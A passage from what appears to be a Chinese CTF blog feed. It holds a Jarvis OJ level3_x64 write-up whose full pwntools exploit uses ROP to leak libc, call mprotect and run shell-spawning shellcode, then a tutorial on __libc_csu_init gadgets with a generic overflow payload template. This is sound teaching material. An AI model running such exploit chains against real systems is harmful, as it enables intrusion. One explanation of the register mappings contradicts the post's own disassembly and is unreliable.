第一个参数start是<code>.bss</code>的起始地址，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p><code>3.执行shellcode</code></p><h3 id="font-color-brown0x02-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown0x02-解题步骤font"></a> <font color="brown"><code>0x02 解题步骤</code></font></h3><h4 id="font-color-navy1泄露write的真实地址font"><a class="markdownIt-Anchor" href="#font-color-navy1泄露write的真实地址font"></a> <font color="navy"><code>1.泄露write的真实地址</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak write real address </span></span><br><span class="line">payload1 = bytes(<span class="number">0x88</span> * <span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u64(r.recv()[:<span class="number">8</span>])</span><br><span class="line">print(<span class="string">"[+] write real addr:"</span>,hex(write_addr))</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发送完payload1后，栈中的情况如下：</p></blockquote><p><img src="/images/129-4.png" alt></p><h4 id="font-color-navy2找出mprotect真实地址font"><a class="markdownIt-Anchor" href="#font-color-navy2找出mprotect真实地址font"></a> <font color="navy"><code>2.找出mprotect真实地址</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get mprotect address </span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">mprotect = libc_base + libc.dump(<span class="string">"mprotect"</span>)</span><br><span class="line">print(<span class="string">"[+] mprotect address:"</span>,mprotect)</span><br></pre></td></tr></table></figure><h4 id="font-color-navy3将mprotect函数地址和shellcode写入bssfont"><a class="markdownIt-Anchor" href="#font-color-navy3将mprotect函数地址和shellcode写入bssfont"></a> <font color="navy"><code>3.将mprotect函数地址和shellcode写入bss</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rop1 and rop2</span></span><br><span class="line">rop1 = <span class="number">0x4006aa</span></span><br><span class="line">rop2 = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write shellcode to bss</span></span><br><span class="line">shellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch=<span class="string">"amd64"</span>)</span><br><span class="line">payload2 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line">payload2 += p64(<span class="number">0x600000</span>) + p64(bss) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发送完<code>payload2</code>后，栈中的情况如下：</p></blockquote><p><img src="/images/129-5.png" alt></p><h4 id="font-color-navy4将bss的权限改为可执行并返回shellcodefont"><a class="markdownIt-Anchor" href="#font-color-navy4将bss的权限改为可执行并返回shellcodefont"></a> <font color="navy"><code>4.将bss的权限改为可执行，并返回shellcode</code></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mprotect bss 7</span></span><br><span class="line">payload3 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss)</span><br><span class="line">payload3 += p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload3 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(bss+<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendlineafter(<span class="string">"Input:\n"</span>,payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>发送完<code>payload3</code>后，栈中的情况如下：</p></blockquote><p><img src="/images/129-6.png" alt></p><blockquote><p>完整的exp如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak write real address </span></span><br><span class="line">payload1 = bytes(<span class="number">0x88</span> * <span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload1 -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u64(r.recv()[:<span class="number">8</span>])</span><br><span class="line">print(<span class="string">"[+] write real addr:"</span>,hex(write_addr))</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- Congratulation! You haved leaked the address of write -+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get mprotect address </span></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">mprotect = libc_base + libc.dump(<span class="string">"mprotect"</span>)</span><br><span class="line">print(<span class="string">"[+] mprotect address:"</span>,mprotect)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1 and rop2</span></span><br><span class="line">rop1 = <span class="number">0x4006aa</span></span><br><span class="line">rop2 = <span class="number">0x400690</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write shellcode to bss</span></span><br><span class="line">shellcode = p64(mprotect) + asm(shellcraft.amd64.sh(),arch=<span class="string">"amd64"</span>)</span><br><span class="line">payload2 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line">payload2 += p64(<span class="number">0x600000</span>) + p64(bss) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(main)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">print(<span class="string">"[*] +-+-+-+-+-+-+-+- sending payload2 -+-+-+-+-+-+-+-+-+ [*]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect bss 7</span></span><br><span class="line">payload3 = bytes(<span class="number">0x88</span>*<span class="string">"a"</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(rop1)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss)</span><br><span class="line">payload3 += p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x600000</span>)</span><br><span class="line">payload3 += p64(rop2) + bytes(<span class="string">"a"</span>*<span class="number">56</span>,encoding=<span class="string">"unicode_escape"</span>) + p64(bss+<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendlineafter(<span class="string">"Input:\n"</span>,payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/129-1.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h3 id=&quot;font-color-brown0x00-相关知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-相关知
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="Jarvis" scheme="https://muzibing.github.io/tags/Jarvis/"/>
    
      <category term="栈溢出" scheme="https://muzibing.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>&lt;_libc_csu_init&gt;中的“通用gadget”</title>
    <link href="https://muzibing.github.io/2020/06/17/2020.06.17%EF%BC%88128%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/17/2020.06.17（128）/</id>
    <published>2020-06-17T05:29:24.307Z</published>
    <updated>2020-06-17T11:12:23.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown0x00-基础知识font"></a> <font color="brown"><code>0x00 基础知识</code></font></h3><h4 id="font-color-navy1x86和x64的传参方式font"><a class="markdownIt-Anchor" href="#font-color-navy1x86和x64的传参方式font"></a> <font color="navy"><code>1.x86和x64的传参方式</code></font></h4><p>      由于X64和X86的传参的方式不同：X86是将参数入栈进行传参，X64则是将前6位参数分别通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递，之后的参数才是通过入栈的形式进行传参，下面通过一个示例程序进行描述，程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d, <span class="keyword">int</span> e, <span class="keyword">int</span> f, <span class="keyword">int</span> g ,<span class="keyword">int</span> h ,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a:%d\tb:%d\tc:%d\td:%d\te:%d\tf:%d\tg:%d\th:%d\ti:%d\t"</span>,a,b,c,d,e,f,g,h,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">100</span>,b=<span class="number">101</span>,c=<span class="number">102</span>,d=<span class="number">103</span>,e=<span class="number">104</span>,f=<span class="number">105</span>,g=<span class="number">106</span>,h=<span class="number">107</span>,i=<span class="number">108</span>; # 十六进制分别为<span class="number">0x64</span>、<span class="number">0x65</span>、<span class="number">0x66</span>、<span class="number">0x67</span>、<span class="number">0x68</span>、<span class="number">0x69</span>、<span class="number">0x6a</span>、<span class="number">0x6b</span>、<span class="number">0x6c</span>、</span><br><span class="line">    fun(a,b,c,d,e,f,g,h,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>x86的传参情况</code></p><p><img src="/images/128-1.png" alt></p><blockquote><p>从上图可以看出在<code>x86</code>下<code>fun</code>函数的参数是通过入栈的形式进行传递的</p></blockquote><p><code>x64的传参情况</code></p><p><img src="/images/128-2.jpg" alt></p><blockquote><p>从上图可以看出在<code>x64</code>下<code>fun</code>函数的前6个参数是通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递，后面的3个函数则是通过入栈的方式</p></blockquote><h4 id="font-color-navy2gadgetfont"><a class="markdownIt-Anchor" href="#font-color-navy2gadgetfont"></a> <font color="navy"><code>2.gadget</code></font></h4><p>      由于x64下函数的前6个参数是通过寄存器<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>和<code>r9</code>进行传递的，所以我们需要一些类似于<code>pop rdi; ret</code>指令来改变这些寄存器的值，来满足我们的需求，而这些指令被称为<code>gadget</code>。</p><p><code>参数个数：1-2个</code></p><p>      当函数的参数比较少时，我们可以在程序中搜索一些简单的gadget指令，其中查找gadget的著名工具有：</p><blockquote><p><strong>ROPEME</strong>: <a href="https://github.com/packz/ropeme" target="_blank" rel="noopener">https://github.com/packz/ropeme</a></p><p><strong>Ropper</strong>: <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></p><p><strong>ROPgadget</strong>: <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSa…</a></p><p><strong>rp++</strong>: <a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p></blockquote><p>      如下图：（使用工具为<code>ROPgadget</code>）</p><p><img src="/images/128-3.png" alt></p><p><code>参数个数：3个</code></p><p>      在上图中我们没有发现可以改变第3个参数的gadget指令（<code>pop rdx;ret</code>），那么我们就无法再控制指令了。因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。<sup>[1]</sup>下文会对通用函数<code>__libc_csu_init</code>中的gadget进行详细解释。一般来说，<a href="http://xn--libc-ps5fo9z9mtkk5bwgj322b30f.so" target="_blank" rel="noopener">只要程序调用了libc.so</a>，程序都会有这个函数用来对libc进行初始化操作。</p><h3 id="font-color-brown0x01-__libc_csu_init源码font"><a class="markdownIt-Anchor" href="#font-color-brown0x01-__libc_csu_init源码font"></a> <font color="brown"><code>0X01 __libc_csu_init源码</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004011d0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4011d0:       41 57                   push   %r15</span><br><span class="line">  4011d2:       4c 8d 3d 37 2c 00 00    lea    0x2c37(%rip),%r15        # 403e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4011d9:       41 56                   push   %r14</span><br><span class="line">  4011db:       49 89 d6                mov    %rdx,%r14</span><br><span class="line">  4011de:       41 55                   push   %r13</span><br><span class="line">  4011e0:       49 89 f5                mov    %rsi,%r13</span><br><span class="line">  4011e3:       41 54                   push   %r12</span><br><span class="line">  4011e5:       41 89 fc                mov    %edi,%r12d</span><br><span class="line">  4011e8:       55                      push   %rbp</span><br><span class="line">  4011e9:       48 8d 2d 28 2c 00 00    lea    0x2c28(%rip),%rbp        # 403e18 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011f0:       53                      push   %rbx</span><br><span class="line">  4011f1:       4c 29 fd                sub    %r15,%rbp</span><br><span class="line">  4011f4:       48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  4011f8:       e8 03 fe ff ff          callq  401000 &lt;_init&gt;</span><br><span class="line">  4011fd:       48 c1 fd 03             sar    $0x3,%rbp</span><br><span class="line">  401201:       74 1b                   je     40121e &lt;__libc_csu_init+0x4e&gt;</span><br><span class="line">  401203:       31 db                   xor    %ebx,%ebx</span><br><span class="line">  401205:       0f 1f 00                nopl   (%rax)</span><br><span class="line">  401208:       4c 89 f2                mov    %r14,%rdx</span><br><span class="line">  40120b:       4c 89 ee                mov    %r13,%rsi</span><br><span class="line">  40120e:       44 89 e7                mov    %r12d,%edi</span><br><span class="line">  401211:       41 ff 14 df             callq  *(%r15,%rbx,8)</span><br><span class="line">  401215:       48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  401219:       48 39 dd                cmp    %rbx,%rbp</span><br><span class="line">  40121c:       75 ea                   jne    401208 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  40121e:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq   </span><br><span class="line">  40122d:       0f 1f 00                nopl   (%rax)</span><br></pre></td></tr></table></figure><blockquote><p>我们将上述程序简化一下，并分为两个部分：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># part 1</span><br><span class="line">  401208:       4c 89 f2                mov    %r14,%rdx</span><br><span class="line">  40120b:       4c 89 ee                mov    %r13,%rsi</span><br><span class="line">  40120e:       44 89 e7                mov    %r12d,%edi</span><br><span class="line">  401211:       41 ff 14 df             callq  *(%r15,%rbx,8)</span><br><span class="line">  401215:       48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  401219:       48 39 dd                cmp    %rbx,%rbp</span><br><span class="line">  40121c:       75 ea                   jne    401208 &lt;__libc_csu_init+0x38&gt;</span><br><span class="line">  40121e:       48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq   </span><br><span class="line">  </span><br><span class="line"># part 2</span><br><span class="line">  401222:       5b                      pop    %rbx</span><br><span class="line">  401223:       5d                      pop    %rbp</span><br><span class="line">  401224:       41 5c                   pop    %r12</span><br><span class="line">  401226:       41 5d                   pop    %r13</span><br><span class="line">  401228:       41 5e                   pop    %r14</span><br><span class="line">  40122a:       41 5f                   pop    %r15</span><br><span class="line">  40122c:       c3                      retq</span><br></pre></td></tr></table></figure><blockquote><p>从位于地址<code>401208</code>到<code>40120e</code>的指令，可以看出：</p><ul><li><code>r14</code> ----&gt; <code>rdx</code> ： <code>arg3</code></li><li><code>r13</code> ----&gt; <code>rsi</code> ： <code>arg2</code></li><li><code>r12</code> ----&gt; <code>rdi</code> ： <code>arg1</code></li></ul><p>我们可以看到利用<code>401222</code>处的代码我们可以控制<code>rbx,rbp,r12,r13,r14和r15</code>的值，随后利用<code>401208</code>处的代码我们将r15的值赋值给<code>rdx</code>,<code>r14</code>的值赋值给<code>rsi</code>,<code>r13</code>的值赋值给<code>edi</code>，随后就会调用<code>call qword ptr [r12+rbx*8]</code>。这时候我们只要再将<code>rbx</code>的值赋值为<code>0</code>，再通过精心构造栈上的数据，我们就可以控制<code>pc</code>去调用我们想要调用的函数了（比如说write函数）。执行完<code>call qword ptr [r12+rbx*8]</code>之后，程序会对<code>rbx+=1</code>，然后对比<code>rbp</code>和<code>rbx</code>的值，如果相等就会继续向下执行并<code>ret</code>到我们想要继续执行的地址。所以为了让<code>rbp</code>和<code>rbx</code>的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。<strong>注意我们的gadget是<code>call qword ptr [r12+rbx*8]</code>，所以我们应该使用<code>write.got</code>的地址而不是<code>write.plt</code>的地址</strong>。</p></blockquote><h3 id="font-color-brown0x02-通用gadget在栈中的情况font"><a class="markdownIt-Anchor" href="#font-color-brown0x02-通用gadget在栈中的情况font"></a> <font color="brown"><code>0X02 通用gadget在栈中的情况</code></font></h3><p>     我们先来推导一下上述代码运行时，栈中的变化，这里要注意的是我们须先执行<code>part2</code>部分的指令，然后再执行<code>part1</code>的指令，假设我们栈中是下图情况（存在栈溢出漏洞）</p><p><img src="/images/128-4.png" alt></p><p>      现在我们构造payload，根据栈中的情况：</p><blockquote><ul><li><code>return address</code>处应该是<code>part2</code>的入口地址</li><li>执行<code>part2</code>中的指令，这时esp指向<code>return address</code></li><li>6 个 <code>pop</code> 语句，依次将栈顶的数据赋值给寄存器<code>rbx</code>、<code>rbp</code>、<code>r12</code>、<code>r13</code>、<code>r14</code>、<code>r15</code></li><li>1 个 <code>ret</code> 语句，此时esp执行的时r15对应栈顶的位置+8</li></ul><p>则我们构造payload如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + <span class="string">"a"</span>*<span class="number">8</span><span class="comment"># 填充部分和old ebp部分</span></span><br><span class="line">payload += p64(part2)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0，因为401211处的callq  *(%r15,%rbx,8)，我们要将r15的值为调用函数的地址</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1，因为401219处的cmp    %rbx,%rbp，这里必须要使得rbx和rbp相等，因为我们将rbx设置为0，而在401215处将rbx进行加1，所以这里rbp的值也要为1</span></span><br><span class="line">payload += p64(arg1)<span class="comment"># r12 = arg1</span></span><br><span class="line">payload += p64(arg2)<span class="comment"># r13 = arg2</span></span><br><span class="line">payload += p64(arg3)<span class="comment"># r14 = arg3</span></span><br><span class="line">payload += p64(function_got_addr)<span class="comment"># r15 = function_got_addr</span></span><br><span class="line">payload += p64(part1)<span class="comment"># return --&gt; part1</span></span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">56</span><span class="comment"># 6个pop指令 + add  $0x8,%rsp语句</span></span><br><span class="line">payload += p64(return_address)<span class="comment"># 返回到指定地址</span></span><br></pre></td></tr></table></figure><blockquote><p>上述payload在栈中的执行情况如下：</p></blockquote><p><img src="/images/128-5.gif" alt></p><p><a href="/pdf/128-5.pdf">点击下载上述过程文件</a></p><blockquote><p>要说明的是，这里的payload并不是固定的，要根据程序的实际情况来定</p></blockquote><h3 id="font-color-brown0x05-其他通用函数font"><a class="markdownIt-Anchor" href="#font-color-brown0x05-其他通用函数font"></a> <font color="brown"><code>0x05 其他通用函数</code></font></h3><p>除了上面介绍的 <code>__libc_csu_init()</code>，还可以到下面的函数中找一找：<sup>[2]</sup></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span 